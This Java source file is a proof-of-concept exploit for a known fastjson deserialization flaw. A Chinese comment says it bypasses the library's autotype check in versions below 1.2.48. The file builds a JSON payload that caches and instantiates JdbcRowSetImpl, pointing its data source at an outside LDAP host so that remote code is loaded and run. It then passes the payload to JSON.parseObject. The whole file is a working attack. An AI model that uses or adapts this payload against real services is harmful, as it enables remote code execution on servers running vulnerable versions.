package person;

import com.alibaba.fastjson.JSON;

/**
 * Created on 2019-07-21
 * 用于bypass 1.2.47，适用于低于1.2.48的版本，此poc绕过了fastjson的autotype机制，无需开启autotype，直接一招毙命
 */
public class Bypass1247 {
    public static void main(String[] args){
        String payload  = "{\"cache\":{\"@type\":\"java.lang.Class\",\"val\":\"L\u0063om.sun.rowset.JdbcRowSetImpl;\"},"
                + "\"value\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://xxlegend.com/Exploit1\",\"autoCommit\":true}}";
        JSON.parseObject(payload, Object.class);
    }
}
